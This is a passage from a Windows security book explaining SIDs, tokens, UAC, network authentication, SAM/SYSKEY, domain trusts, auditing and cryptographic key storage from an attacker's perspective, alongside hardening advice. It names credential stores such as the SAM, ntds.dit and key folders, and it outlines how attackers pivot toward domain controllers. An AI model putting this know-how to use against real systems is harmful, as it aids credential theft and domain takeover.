in many  instances to execute privilege escalation attacks against Windows  see Chapter 7 .  Restricted Groups A pretty nifty concept that was introduced with Windows 2000, Restricted Groups allows  an administrator to set a domain policy that restricts the membership of a given group.  For example, if an unauthorized user adds himself to the local Administrators group on  a domain member, upon the next Group Policy refresh, that account will be removed so  that membership reflects that which is defined by the Restricted Groups policy. These  settings are refreshed every 90 minutes on a member computer, every 5 minutes on a  domain controller, and every 16 hours whether or not changes have occurred.  Computers  Machine Accounts   When  a  Windows  system  joins  a  domain,  a  computer  account  is  created.  Computer  accounts are essentially user accounts that are used by machines to log on and access  resources  thus, computers are also called machine accounts . This account name appends  a dollar sign  $  to the name of the machine  machinename$ .  As you might imagine, to log on to a domain, computer accounts require passwords.  Computer passwords are automatically generated and managed by domain controllers.  See  the  upcoming  section  “Forests,  Trees,  and  Domains.”   Computer  passwords  are    Chapter 2:  The Windows Security Architecture from the Hacker’s Perspective   29  Identity Anonymous Logon  SID S-1-5-7  Authenticated Users  S-1-5-11  INTERACTIVE  S-1-5-4  Everyone  Network  Service  S-1-1-0  S-1-5-2  S-1-5-6  This Organization  S-1-5-15  Other Organization  S-1-5-1000  Comment Special hidden group that includes all  users who have authenticated with null  credentials Special hidden group that includes all  currently logged-on users All users logged on to the local system  via the physical console or Terminal  Services All current network users, including  guests and users from other domains All users logged on through a network  connection; access tokens for interactive  users do not contain the Network SID All security principals that have  logged on as a service; membership is  controlled by the operating system New to Windows Server 2003, added  by the authentication server to the  authentication data of a user, provided  the Other Organization SID is not  already present New to Windows Server 2003, causes  a check to ensure that a user from  another forest or domain is allowed to  authenticate to a particular service  Table 2-4  Windows Special Identities  also called well-known groups   otherwise  stored  and  accessed  just  like  any  other  user  account  password.   See  the  upcoming section “The SAM and Active Directory.”  By default, they are reset every 30  days, but administrators can configure a different interval if they want.  The  primary  use  for  computer  accounts  is  to  create  a  secure  channel  between  the  computer and the domain controller for purposes of exchanging information. By default,  this secure channel is not encrypted  although some of the information that passes through  it is already encrypted, such as password hashes , and its integrity is not checked  thus  making  it  vulnerable  to  spoofing  or  man-in-the-middle  attacks .  For  example,  when  a  user logs on to a domain from a domain member computer, the logon exchange occurs  over the secure channel negotiated between the member and the domain controller.   30   Hacking Exposed Windows: Windows Security Secrets & Solutions   We’ve never heard of a case where exploitation of a machine account has resulted in   a serious exposure, so we will not discuss this much in this book.  User Rights  Recall the main goal of the attacker from the beginning of this chapter:  To execute commands in the most privileged context, in order to gain access to resources  and data.  We’ve just described some of the “most privileged” user mode account contexts, such  as Administrator and LocalSystem. What makes these accounts so powerful? In a word   two words, actually , user rights. User rights are a finite set of basic capabilities, such as  logging on locally or debugging programs. They are used in the access control model in addition  to  the  standard  comparing  of  access  token  SIDs  to  security  descriptors.  User  rights  are  typically  assigned  to  groups,  since  this  makes  them  easier  to  manage  than  constantly assigning them to individual users. This is why membership in groups is so  important—because the group is typically the unit of privilege assignment.  Two types of user rights can be granted: logon rights and privileges. This is simply a  semantic classification to differentiate rights that apply before an account is authenticated  and after, respectively. More than 40 discrete user rights are available in Windows Server  2008  code name Longhorn , and although each can heavily impact security, we discuss  only those that have traditionally had a large security impact. Table 2-5 outlines some of  the privileges we consider critical, along with our recommended configurations.  Note  that  the  “deny”  rights  supersede  their  corresponding  “allow”  rights  if  an   account is subject to both policies.  including the following:  Some user rights relevant to security were implemented in Windows Server 2003,      Allow logon through Terminal Services    Deny logon through Terminal Services    Impersonate a client after authentication    Perform volume maintenance tasks  The  Terminal  Services–related  rights  were  implemented  to  address  a  gap  in  the  “Allow  deny access to this computer from the network” rights, which do not apply to  Terminal Services. The “Impersonate a client after authentication” right was added to  help mitigate privilege escalation attacks in which lower privileged services impersonated  higher privileged clients.  Last but not least in our discussion of user rights is a reminder always to use the  principle  of  least  privilege.  We  see  too  many  people  logging  on  as  Administrator- equivalent accounts to perform daily work. By taking the time up front to consider the  appropriate user rights, most of the significant security vulnerabilities discussed in this  book can be alleviated. Log on as a lesser privileged user, and use the runas tool  see  Chapter 12  to escalate privileges when necessary.

How does the operating system  decide whether a security principal can access a protected resource?  First, Windows must determine whether it is dealing with a valid security principal.  This is done via authentication. The simplest example is a user who logs on to Windows  via the console. The user strikes the standard CTRL-ALT-DEL attention signal to bring up the    32   Hacking Exposed Windows: Windows Security Secrets & Solutions   The Token  Windows  secure  logon  facility  and  then  enters  an  account  name  and  password.  The  secure logon facility passes the entered credentials through the user mode components  responsible for validating them  primarily, LSASS . Assuming the credentials are valid,  LSASS creates a token  or access token  that is then attached to the user’s logon session and  is produced on any subsequent attempt to access resources.  The pre-Vista secure logon user interface can be Trojaned by Administrator-equivalent users, as we  will discuss in Chapter 7. Starting with Vista, a new credential provider  CP  framework makes such  attacks obsolete, although a malicious CP is just as dangerous.  On Windows XP and later, press the WINDOWS key and L simultaneously to lock your desktop; this is an  alternative to pressing CTRL-ALT-DELETE and then ENTER.  The token contains a list of all of the SIDs associated with the user account, including the  account’s SID, and the SIDs of all groups and special identities of which the user account  is a member  for example, Domain Admins or INTERACTIVE . You can use a tool like  whoami  included by default beginning with Windows Server 2003  to discover what  SIDs are associated with a logon session, as shown next  many lines have been truncated  due to page width constraints : C:\>whoami  user  groups USER INFORMATION ----------------  User Name       SID ==================== ========================================= vegas2\jsmith   S-1-5-21-1527495281-1310999511-3141325392-500  GROUP INFORMATION -----------------  Group Name       Type      SID             Attributes =============================================================== Everyone    Well-known group    S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\Administrators    Alias    S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner BUILTIN\Users    Alias    S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\Pre-Windows 2000 Compatible Access  Alias  S-1-5-32-554   Chapter 2:  The Windows Security Architecture from the Hacker’s Perspective   33  Mandatory group, Enabled by default, Enabled group NT AUTHORITY\INTERACTIVE  Well-known group   S-1-5-4 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\Authenticated Users  Well-known group  S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\This Organization  Well-known group  S-1-5-15 Mandatory group, Enabled by default, Enabled group LOCAL    Well-known group     S-1-2-0 Mandatory group, Enabled by default, Enabled group VEGAS2\Group Policy Creator Owners  Group  S-1-5-21-[cut]-520 Mandatory group, Enabled by default, Enabled group VEGAS2\Domain Admins    Group    S-1-5-21-[cut]-512 Mandatory group, Enabled by default, Enabled group VEGAS2\Schema Admins    Group    S-1-5-21-[cut]-518 Mandatory group, Enabled by default, Enabled group VEGAS2\Enterprise Admins    Group    S-1-5-21-[cut]-519 Mandatory group, Enabled by default, Enabled group  This example shows that the current process is run in the context of user jsmith, who is a  member  of  Administrators  and  Authenticated  Users  and  also  belongs  to  the  special  identities Everyone, LOCAL, and INTERACTIVE.  When  jsmith  attempts  to  access  a  resource,  such  as  a  file,  the  Windows  security  subsystem compares his token to the DACL on the object, which specifies SIDs that are  permitted to access the object and includes the ways it may be accessed  such as read,  write, execute, and so on . If one of the SIDs in jsmith’s token matches a SID in the DACL,  then jsmith is granted access as specified in the DACL. This process is diagrammed in  Figure 2-2.  Impersonation To save network overhead, the Windows NT family was designed to impersonate a user  account context when it requests access to resources on a remote server. Impersonation  works by letting the server notify the security subsystem that it is temporarily adopting  the token of the client making the resource request. The server can then access resources  on behalf of the client, and the security subsystem validates all access as normal. The  classic  example  of  impersonation  is  anonymous  requests  for  web  pages  via  IIS.  IIS  impersonates the IUSR_machinename account during all of these requests.  Restricted Token Windows 2000 introduced the restricted token. A restricted token is typically assigned to a  child process so that it has more limited access than its parent. For example, an application  might  derive  a  restricted  token  from  the  primary  or  impersonation  token  to  run  an  untrusted code module if inappropriate actions could be performed using the primary  token’s full privileges.   34   Hacking Exposed Windows: Windows Security Secrets & Solutions   Authenticates with account  name password  WinLogon  User jsmith  Success!

Chapter 2:  The Windows Security Architecture from the Hacker’s Perspective   35  Delegation Delegation was a new feature in Windows 2000 that allowed a service to impersonate a  user account or computer account to access resources throughout the domain. Windows  2000 had two limitations with regards to this feature:     Delegation could not be constrained; that is, a delegated account could access   any resource in the domain.     Delegation required Kerberos authentication.  Both  of  these  shortcomings  were  addressed  in  Windows  Server  2003.  Delegation  can  now be constrained to specific services, and Kerberos is no longer required.  You still must beware of trusting computer accounts for delegation, as this allows the LocalSystem  account on that computer to access services on the domain.  Integrity Levels, UAC, and LoRIE With  Windows  Vista,  Microsoft  implemented  an  extension  to  the  basic  system  of  discretionary access control we just described. The primary intent of this change was to  implement mandatory access control in certain scenarios. For example, actions that require  administrative privilege would require a further authorization, beyond that associated  with  the  user  context  access  token.  Microsoft  termed  this  new  architecture  extension  Mandatory Integrity Control  MIC .  To accomplish mandatory access control–like behavior, MIC effectively implements  a new set of four security principals called Integrity Levels  ILs  that can be added to  access tokens and ACLs:     Low    Medium    High    System  ILs are implemented as SIDs, just like any other security principal. Now, in addition  to the standard access control check we described earlier in the chapter, Windows will  also check whether the IL of the requesting access token matches the IL of the target  resource. For example, a Medium-IL process may be blocked from reading, writing, or  executing “up” to a High-IL object.  MIC isn’t directly visible when using Vista, but rather it serves as the underpinning  of some of the key new security features in the OS: User Account Control  UAC  and  Low Rights Internet Explorer  LoRIE . We’ll talk briefly about them to show how MIC  works in practice.  UAC  it was named Least User Access, or LUA, in pre-release versions of Vista  is   perhaps the most visible new security feature in Vista. It works as follows:     1.  Developers “mark” applications by embedding an application manifest  available   since XP  to tell the operating system whether the application needs elevated  privileges.   36   Hacking Exposed Windows: Windows Security Secrets & Solutions            2.  The LSA has been modiﬁ ed to grant two tokens at logon to administrative   accounts: a ﬁ ltered token and a linked token. The ﬁ ltered token has all elevated  privileges stripped out  using the restricted token mechanism described earlier .  3.  Applications are run by default using the ﬁ ltered token; the full-privilege  linked token is used only when launching applications that are marked as  requiring elevated privileges.  4.  The user is prompted using a special consent environment  the rest of the  session is grayed out and inaccessible  whether they in fact want to launch  the program, and may be prompted for appropriate credentials if they are  not members of an administrative group.  Assuming application developers are well-behaved, Vista thus achieves mandatory  access  control  of  a  sort:  only  specific  applications  can  be  launched  with  elevated  privileges.  Here’s how UAC uses MIC: All non-administrative user processes run with Medium- IL by default. Once a process has been “elevated” using UAC, it runs with High-IL, and  can  thus  access  objects  at  that  level.  Thus,  it’s  now  “mandatory”  to  have  High-IL  privileges to access certain objects within Windows.  MIC also underlies the LoRIE implementation in Vista: The Internet Explorer process   iexplore.exe  runs at Low-IL and, in a system with default configuration, can write only  to objects that are labeled with Low-IL SIDs  by default, this includes only the folder  %USERPROFILE%\AppData\LocalLow  and  the  Registry  key  HKCU\Software\ AppDataLow . LoRIE thus cannot write to any other object in the system by default,  greatly  restricting  the  damage  that  can  be  done  if  the  process  gets  compromised  by  malware while browsing the Internet.  In  the  Vista  release,  provisions  are  in  place  to  allow  unmarked  code  to  run  with  administrative  privileges. In future releases, the only way to run an application elevated will be to have a signed  manifest that identifies the privilege level the application needs.  UAC can be disabled system-wide under the User Accounts Control Panel, Turn User Account Control  Off setting,  Security researcher Joanna Rutkowska wrote some interesting criticisms of UAC and  MIC in Vista at http:  theinvisiblethings.blogspot.com 2007 02 running-vista-every- day.html.  Windows  technology  guru  Jesper  Johansson  has  written  some  insightful  articles on UAC in his blog at http:  msinfluentials.com blogs jesper .  Network Authentication  Local authentication to Windows via the CTRL-ALT-DEL attention signal is straightforward,  as we have described. However, logging on to Windows via the network, the primary  goal of the malicious hacker, involves exploiting network authentication. We will discuss  this briefly here to inform discussions in later chapters on several weaknesses associated  with some components of Windows network authentication protocols.   Chapter 2:  The Windows Security Architecture from the Hacker’s Perspective   37  The NT family primarily utilizes challenge response authentication, wherein the server  issues a random value  the challenge  to the client, which then performs a cryptographic  hashing function on it using the hash of the user’s password and sends this newly hashed  value  the response  back to the server. The server then takes its copy of the user’s hash  from the local Security Accounts Manager  SAM  or Active Directory  AD , hashes the  challenge it just sent, and compares it to the client’s response. Thus, no passwords ever traverse the wire during NT family authentication, even in encrypted form. The challenge  response mechanism is illustrated in Figure 2-3 and is described more fully in Knowledge  Base  KB  article Q102716.

The NT family can use one of three different   hashing algorithms to scramble the 8-byte challenge:     LANMan  LM  hash    NTLM hash    NTLM version 2  NTLMv2   In Chapter 5, we discuss a weakness with the LM hash that allows an attacker with  the  ability  to  eavesdrop  on  the  network  to  guess  the  password  hash  itself  relatively  easily; the hacker can then use it to attempt to guess the actual password offline—even  though the password hash never traverses the network!  To combat this, Microsoft released an improved NT-only algorithm, NTLM, with NT  4 Service Pack 3 and a further secured version in NT 4 SP4 called NTLM v2. Windows  95 98 clients do not natively implement NTLM, so the security offered by NTLM and  NTLMv2  was  not  typically  deployed  on  mixed  networks  in  the  past.   The  DSClient  utility that comes on the Windows 2000 CD-ROM upgrades Windows 9x clients so that  they can perform NTLM and NTLMv2 authentication.   Homogeneous Windows 2000 and later environments can use the built-in Kerberos  v5 protocol that was introduced in Windows 2000. However, Windows Server 2003 is  completely backward-compatible with LM, NTLM, and NTLMv2 and will downgrade  to the appropriate authentication protocol if Kerberos cannot be negotiated. Kerberos  will be used only if both client and server support it, both machines are referenced by  their DNS or machine name  not IP address , and both the client and server belong to the  same forest  unless a third-party Kerberos implementation is used .  As we discuss in Chapter 5, Kerberos is susceptible to eavesdropping attacks.  Table 2-6 presents a quick summary of Windows NT family network authentication   mechanisms.  For simplicity’s sake, we have purposely left out of this discussion consideration of  Microsoft Challenge Handshake Authentication Protocol  MS-CHAP , which is used for  remote access; web-based authentication protocols like HTTP Basic and Digest; Remote  Authentication Dial-In User Service  RADIUS ; and a few others. Although these protocols  are slightly different from what we have described so far, they still depend on the four core  protocols described in Table 2-6, which are used in some form or another to authenticate all  network access.  Network Sharing and Security Model for Local Accounts Beginning with Windows XP, Microsoft implemented some changes to the way access  control  is  applied  to  shared  resources.  In  local  or  domain  Security  Policy,  under  the  setting entitled Network Access: Sharing And Security Model For Local Accounts, the  following two options are configurable:    Classic  Local users authenticate as themselves.   Guest Only  Local users always authenticate as Guest.   Chapter 2:  The Windows Security Architecture from the Hacker’s Perspective   39  Supported Clients  Comments  Authentication  Type LANMan  All  NTLM  NTLMv2  Kerberos  NT 4 SP3,  Windows Server  2000 and later NT4 post-SP4,  Windows Server  2000 and later Windows Server  2000 and later  Windows 9x must use this, but it is  susceptible to eavesdropping attacks;  DSClient allows Windows 9x to use NTLM Much more robust security than LANMan  Improved security over NTLM;  recommended for heterogeneous  NT4 2000 environments Used only if end-to-end Windows 2000 or  greater and intra-forest  Table 2-6  Core Windows Network Authentication Mechanisms  The Guest Only setting could be helpful for systems with lots of file shares to force  equivalent  levels  of  access  across  all  shares.  We  recommend  sticking  with  Classic,  however, as we believe it’s better to be explicit about access control.  The SAM and Active Directory  Now  that  we’ve  provided  an  overview  of  security  principals  and  capabilities,  let’s  explore  in  more  detail  how  objects  such  as  accounts  and  passwords  are  managed  in  Windows.  On  all  Windows  computers,  the  SAM  contains  user  account  name  and  password information. The password information is kept in a scrambled format such  that it cannot be unscrambled using known techniques  although the scrambled value  can still be guessed, as you will see in Chapter 7 . The scrambling procedure is called a  one-way function  OWF , or hashing algorithm, and it results in a hash value that cannot  be decrypted. We will refer to the password hashes a great deal in this book. The SAM  makes up one of the five Registry hives and is implemented in the file %systemroot%\ system32\config\sam.  On Windows Server 2000 and later domain controllers, user account hash data for  the domain is kept in the Active Directory  %systemroot%\ntds\ntds.dit, by default .  The hashes are kept in the same format, but they must be accessed via different means.  SYSKEY Under NT, password hashes were stored directly in the SAM file. Starting with NT 4  Service Pack 3, Microsoft provided the ability to add another layer of encryption to the  SAM  hashes,  called  SYSKEY.  SYSKEY,  short  for  SYStem  KEY,  essentially  derived  a  random  128-bit  key  and  encrypted  the  hashes  again   not  the  SAM  file  itself,  just  the    40   Hacking Exposed Windows: Windows Security Secrets & Solutions   hashes .  To  enable  SYSKEY  on  NT  4,  you  have  to  run  the SYSKEY  command,  which  presents a window like the following:  Clicking the Update button in this window presents further SYSKEY options, namely  the ability to determine how or where the SYSKEY is stored. The SYSKEY can be stored  in one of three ways:    Mode 1  Stored in the Registry and made available automatically at boot time     Mode 2  Stored in the Registry but locked with a password that must be    this is the default   supplied at boot time    Mode 3  Stored on a ﬂ oppy disk that must be supplied at boot time The following illustration shows how these modes are selected:  Modern Windows versions  up to and including Server 2008  still implement SYSKEY  Mode 1 by default, and thus passwords stored in either the SAM or Active Directory are  encrypted with SYSKEY as well as hashed. It does not have to be enabled manually, as    Chapter 2:  The Windows Security Architecture from the Hacker’s Perspective   41  with NT 4 SP3 and later. In Chapters 7 and 11, we discuss the implications of SYSKEY  and mechanisms to circumvent it.  FORESTS, TREES, AND DOMAINS  To this point, we have been discussing the Windows NT family in the context of individual  computers. A group of Windows NT family systems can be aggregated into a logical unit  called a domain. Windows domains can be created arbitrarily simply by promoting one  or several Windows Servers to a domain controller  DC . Domain controllers are secured  storage  repositories  for  shared  domain  information  and  also  serve  as  the  centralized  authentication  authorities  for  the  domain.  In  essence,  a  domain  sets  a  distributed  boundary for shared accounts. All systems in the domain share a subset of accounts.  Unlike  NT,  which  specified  single-master  replication  from  primary  domain  controllers   PDCs  to backup domain controllers  BDCs , Windows 2000 and later domain controllers  are all peers and engage in multi-master replication of the shared domain information.  One of the biggest impacts of the shift to Active Directory in Windows 2000 was that  domains were no longer the logical administrative boundary they once were under NT.  Supra-domain structures, called trees and forests, exist above domains in the hierarchy of  Active Directory. Trees are related mostly to naming conventions and have few security  implications, but forests demarcate the boundary of Windows 2000 and later directory  services and are thus the ultimate boundary of administrative control. Figure 2-4 shows  the structure of a sample Windows Server 2003 forest.  Forest  Tree  Two-way transitive trusts throughout forest  corp.com   Forest Root, first domain forest   division.com  branch.corp.com  secure.corp.com  branch.division.com  Domain  Figure 2-4  The structure of Windows forests   42   Hacking Exposed Windows: Windows Security Secrets & Solutions   Although we’re glossing over a great deal of detail about Active Directory, we are  going to stop this discussion here to keep focused on the aspect of domains that are the  primary target for malicious attackers: account information.  Scope: Local, Global, and Universal  You’ve probably noticed the continuing references to local accounts and groups versus  global and universal accounts. Under NT, members of local groups had the potential to  access resources within the scope of the local machine, whereas members of global groups  were potentially able to access resources domain-wide. Local groups can contain global  groups, but not vice versa, because local groups have no meaning in the context of a  domain. Thus, a typical strategy would be to add domain users  aggregated in a global  group to ease administrative burden  to a local group to define access control to local  resources. For example, when a computer joins a domain, the Domain Admins global  group is automatically added to the Local Administrators group, allowing any members  of Domain Admins to authenticate to and access all resources on the computer.  Active Directory complicates this somewhat. Table 2-7 lists the scopes relevant to AD. Depending on the mode of the domain  native versus mixed-mode—see “References   and Further Reading” , these types of groups have different limitations and behaviors.  Scope  Description  Members May Include  Local  Intra-computer  May Be Granted  Access to Resources on Local computer only  Domain Local  Intra-domain  Only in the same domain  Accounts, global  groups, and universal  groups from any domain Accounts, global  groups, and universal  groups from any domain; domain local  groups from the same domain Accounts and global  groups from the same domain Accounts, global  groups, and universal  groups from any domain  Any domain in the  forest  Any domain in the  forest  Global  Interdomain  Universal  Forest-wide  Table 2-7  Account Scopes   Chapter 2:  The Windows Security Architecture from the Hacker’s Perspective   43  Trusts  Windows  can  form  interdomain  relationships  called  trusts.  Trust  relationships  only  create  the  potential  for  interdomain  access;  they  do  not  explicitly  enable  it.  A  trust  relationship is thus often explained as building a bridge without lifting the tollgate. For  example,  a  trusting  domain  may  use  security  principals  from  the  trusted  domain  to  populate access control lists  ACLs  on resources, but this is only at the discretion of the  administrators of the trusting domain and is not inherently set up.  Trusts can be said to be one-way or two-way. A one-way trust means that only one  domain trusts the other, not vice versa. Two-way trusts define two domains that trust  each  other.  A  one-way  trust  is  useful  for  allowing  administrators  in  one  domain  to  define access control rules within their domain, but not vice versa.  Trusts can also be transitive or nontransitive. In transitive trusts, if Domain A transitively  trusts Domain B and Domain B transitively trusts Domain C, then Domain A transitively  trusts Domain C.  By default, all domains within a  post-NT  Windows forest have transitive, two-way trusts  between each other. Windows can establish one-way, nontransitive trusts to other domains  outside of the forest or to legacy NT domains. It can also establish trusts with other  forests.  See the upcoming section “Forest Trusts.”   Administrative Boundaries: Forest or Domain?  We are frequently asked the question, “What is the actual security boundary within a  Windows  forest—a  domain  or  the  forest?”  The  short  answer  to  this  question  is  that  while the domain is the primary administrative boundary, it is no longer the airtight  security boundary that it was under NT, for several reasons.  One reason is the existence of universal groups that may be granted privileges in  any  domain  within  the  forest  because  of  the  two-way  transitive  trusts  that  are  automatically  established  between  every  domain  within  the  forest.  For  example,  consider  members  of  the  Enterprise  Admins  and  Schema  Admins  who  are  granted  access to certain aspects of child forests by default. These permissions must be manually  removed to prevent members of these groups from performing actions within a given  domain.  You must also be concerned about Domain Admins from all other domains within  the forest. A little-known fact about Active Directory forests, as stated in the Windows  2000 Server Resource Kit Deployment Planning Guide, is that “Domain Administrators of  any  domain  in  the  forest  have  the  potential  to  take  ownership  and  modify  any  information in the Configuration container of Active Directory. These changes will be  available and replicate to all domain controllers in the forest. Therefore, for any domain  that is joined to the forest, you must consider that the Domain Administrator of that  domain  is  trusted  as  an  equal  to  any  other  Domain Administrator.”  The  Deployment Planning  Guide  goes  on  to  specify  the  following  scenarios  that  would  necessitate  the  creation  of  more  than  one  forest.  The  following  material  is  quoted  directly  from  the  Windows 2000 Server Resource Kit Deployment Planning Guide  see the “References and  Further Reading” section .   44   Hacking Exposed Windows: Windows Security Secrets & Solutions   If individual organizations:  Do Not Trust Each Other’s Administrators A representation of every object in the forest resides in the global catalog. It is possible  for an administrator who has been delegated the ability to create objects to intentionally  or unintentionally create a “denial of service” condition. You can create this condition  by rapidly creating or deleting objects, thus causing a large amount of replication to the  global catalog. Excessive replication can waste network bandwidth and slow down  global catalog servers as they spend time to process replication.  Cannot Agree on a Forest Change Policy Schema changes, conﬁ guration changes, and the addition of new domains to a forest  have forest-wide impact. Each of the organizations in a forest must agree on a process  for implementing these changes, and on the membership of the Schema Administrators  and Enterprise Administrators groups. If organizations cannot agree on a common  policy, they cannot share the same forest.  Want to Limit the Scope of a Trust Relationship Every domain in a forest trusts every other domain in the forest. Every user in the forest  can be included in a group membership or appear on an access control list on any  computer in the forest. If you want to prevent certain users from ever being granted  permissions to certain resources, then those users must reside in a different forest than  the resources. If necessary, you can use explicit trust relationships to allow those users  to be granted access to resources in speciﬁ c domains.  If you are unable to yield administrative control of your domain, we suggest that you  maintain  separate  forests.  Of  course,  you  then  lose  all  the  benefits  of  a  unified  forest  model, such as a shared global catalog and directory object space, and you also add the  overhead of managing an additional forest. This is a good illustration of the trade-off  between convenience and security.  The Flip Side: Can I Trust an Internet-Facing Domain? We are also often asked the opposite question: Is it better to create a separate forest in  order  to  add  semitrusted  domains  to  the  organization?  This  question  is  especially  pertinent to creating a domain that will be accessible from the Internet, say for a web  server farm. This situation can be handled in one of two ways.  One,  you  could  create  a  separate  Internet-facing  forest,  and  establish  old-style,  explicit one-way trust to a domain within the corporate forest to protect it from potential  compromise. Again, you would lose the benefit of a shared directory across all domains  in this scenario while gaining the burden of multiforest management.  The second option is to collapse the Internet-facing domain into an OU within the  corporate forest. The administrator of the OU can then be delegated control over only  those objects that are resident in the OU. Even if that account becomes compromised, the  damage to the rest of the forest is limited.  As  with  many  decisions  of  this  nature,  the  choice  comes  down  to  higher  security   versus easier management. Before you decide, read the next section.   Chapter 2:  The Windows Security Architecture from the Hacker’s Perspective   45  Implications of Domain Compromise So what does it mean if a domain within a forest becomes compromised? Let’s say a hacker  knocks over a domain controller in an Internet-facing domain, or a disgruntled employee  suddenly  decides  to  play  rogue  Domain  Admin.  Here’s  what  they  might  attempt,  summarizing the points made in this section on forest, tree, and domain security.  At the very least, every other domain in the forest is at risk because Domain Admins  of any domain in the forest have the ability to take ownership and modify any information  in  the  Configuration  container  of Active  Directory  and  may  replicate  changes  to  that  container to any domain controller in the forest. Also, if any external domain accounts  are authenticated in the compromised domain, the attacker may be able to glean these  credentials via the LSA Secrets cache  see Chapter 8 , expanding his influence to other  domains  in  the  forest  or  to  domains  in  other  forests.  Finally,  if  the  root  domain  is  compromised, members of the Enterprise Admins or Schema Admins have the potential  to exert control over aspects of every other domain in the forest, unless those groups  have had their access limited manually. Forest Trusts In Windows 2000, there was no way to establish trusts between forests. If users in one  forest needed access to resources in a second forest, you were limited to creating an external  trust relationship between two domains within either forest. Such trusts are one-way and  nontransitive and therefore do not extend the trust paths throughout each forest.  Windows Server 2003 introduced forest trusts, a new trust type that allows all domains  in one forest to  transitively  trust all domains in another forest, via a single trust link  between the two forest root domains. The primary benefit of this feature is to provide  companies that acquire or merge with other companies an easier integration path for  their existing infrastructures.  To create a forest trust, all domain controllers in both forests must be running in native   mode  which requires all domain controllers to be Windows Server 2003 or later .  Forest trusts can be one-way or two-way, but they are not transitive at the forest level across three or  more forests. If Forest A trusts Forest B, and Forest B trusts Forest C, this does not create a trust  relationship between Forest A and Forest C.  Authentication Firewall  By default, users in trusted forests are able to authenticate to any  resources in the other forest via the Authenticated Users identity, unless the Selective  Authentication option has been set on the trust. This enables the authentication firewall, a  new feature in Windows Server 2003 that allows users to authenticate only to selected  resources across a native mode trust.  The authentication firewall stops all authentications at the domain controllers in the  resource forest. The domain controller adds the Other Organization SID  see Table 2-4  to  the user’s authentication token. This SID is checked against an Allowed To Authenticate  right on an object for the specified user or group from the other forest or domain  this  must have been manually configured previously . If this check is successful, the This  Organization  SID  is  added  to  the  user’s  authentication  token,  replacing  the  Other  Organization SID  you can have only one or the other .   46   Hacking Exposed Windows: Windows Security Secrets & Solutions   AUDITING  Recall that forest trusts are possible only in Windows Server 2003 and later native mode domains, so  an authentication firewall can be used only in that scenario.  The Bottom Line Here’s a summary of Windows forests, trees, and domains from a malicious hacker’s  perspective:  Domain controllers are the most likely target of malicious attacks, since they house a  great deal more account information. They are also the most likely systems in a Windows  environment to be heavily secured and monitored, so a common ploy is to attack  more poorly defended systems on a domain and then leverage this early foothold to  subsequently gain complete control of any domains related to it. The extent of the damage  done through the compromise of a single system is greatly enhanced when accounts from  one domain are authenticated in other domains via use of trusts. The boundary of security  in Windows 2000 and later is the forest, not the domain as it was under NT. Forest trusts  can be set up between Windows Server 2003 and later native mode forests, extending  security boundaries across both forests unless the authentication ﬁ rewall is enabled.  We’ve  talked  a  lot  about  authentication  and  access  control  so  far,  but  the  NT  family  security subsystem can do more than simply grant or deny access to resources. It can also  audit such access. The Windows audit policy is defined via Security Policy. It essentially  defines  which  events  to  record,  and  it  is  managed  via  the  Local  Security  Authority  Subsystem  LSASS again . The kernel mode portions of the security subsystem work in  concert with the Windows Object Manager to generate audit records and send them to  LSASS. LSASS adds relevant details  the account SID performing the access, and so on   and writes them to the Event Log, which in turn records them in the Security Event Log. If auditing is set for an object, a System Access Control List  SACL  is assigned to  the  object.  The  SACL  defines  the  operations  by  which  users  should  be  logged  in  the  security audit log. Both successful and unsuccessful attempts can be audited.  For Windows systems, we recommend that the system audit policy be set to the most  aggressive settings  auditing is disabled by default . That is, enable audit of success  failure for all of the Windows events except process tracking, as shown in Figure 2-5.  Note that enabling auditing of object access does not actually enable auditing of all  object access; it enables only the potential for object access to be audited. Auditing must  still  be  specified  on  each  individual  object.  On  Windows  domain  controllers,  heavy  auditing of directory access may incur a performance penalty. Make sure to tailor your  audit settings to the specific role of the system in question. Event Log Management For  large-scale  environments,  probably  the  most  significant  issue  you  will  face  with  Windows auditing is not what to audit, but how to manage the data that is produced. In  brief, we recommend setting the Security Event Log to a maximum size of 131,072 KB  and  to  overwrite  as  needed  for  most  applications   this  is  now  the  default  setting  in  Windows Server 2008 . The Application Log and the System Log should be set to around  20 percent of this size.   Chapter 2:  The Windows Security Architecture from the Hacker’s Perspective   47  Figure 2-5  Recommended Windows audit policy  Event Log size and related configurations can be set centrally using the Group Policy Object Editor to  edit domain policy; look under Computer Configuration\Windows Settings\Security Settings\Event Log.  Microsoft  introduced  some  improvements  to  the  security  auditing  subsystem  in  Vista, including the ability for audit categories to include multiple subcategories. Vista  also integrates audit event collection and forwarding of critical audit data to a central  location   this  capability  was  originally  announced  as  the  Microsoft  Audit  Collection  System, or MACS, and was pulled from a post–Windows Server 2003 release; similar  functionality  is  slated  to  ship  in  future  versions  of  Microsoft  Operations  Manager   MOM  .  The  feature  is  now  available  under  Computer  Management\Event  Viewer\ Subscriptions.  Both  of  these  features  enable  enterprises  to  improve  their  ability  to  organize,  analyze,  and  correlate  audit  data.  Third-party  security  event–management  tools are also available from companies including ArcSight and NetIQ.  Cryptography  This  chapter  has  focused  primarily  on  basic  access  control  features  of  the  operating  system, but what about more powerful security features such as cryptography? Beginning  in Windows 2000, each user account received a public private key pair that is used by  the operating system to perform many significant functions. A malicious hacker who  compromises  an  account  typically  gains  the  ability  to  access  the  cryptographic  keys  associated with that account. You will see one classic example of this in Chapter 11, when  we explore how the Encrypting File System  EFS  uses cryptographic keys associated  with user accounts to encrypt files.  Table 2-8 lists storage locations in Windows Server 2003 for cryptographic materials. You can use the Certificates Microsoft Management Console  MMC  snap-in to view  a user’s personal certificate stores. The RSA folder must never be renamed or moved    48   Hacking Exposed Windows: Windows Security Secrets & Solutions   Key User private  key  Stored %userproﬁ le%\Application  Data\Microsoft\Crypto\RSA\  also on domain controller if  roaming proﬁ le   %userproﬁ le%\Application  Data\Microsoft\Protect  also on domain controller  if roaming proﬁ le  %userproﬁ le%\Application  Data\Microsoft\ SystemCertiﬁ cates\My\ Certiﬁ cates  Stored as a global LSA Secret in  HKLM SAM  User master  key  User public key  certiﬁ cates  Domain controller  backup  restore  master key  Table 2-8  Storage Locations for Cryptographic Keys  Comments All ﬁ les in this folder  are encrypted with  the user’s master  key and RC4  128- or  56-bit depending on  localization  The master key is  encrypted automatically  by the Protected Storage  service and stored here Typically published  to allow others to  encrypt data that can be  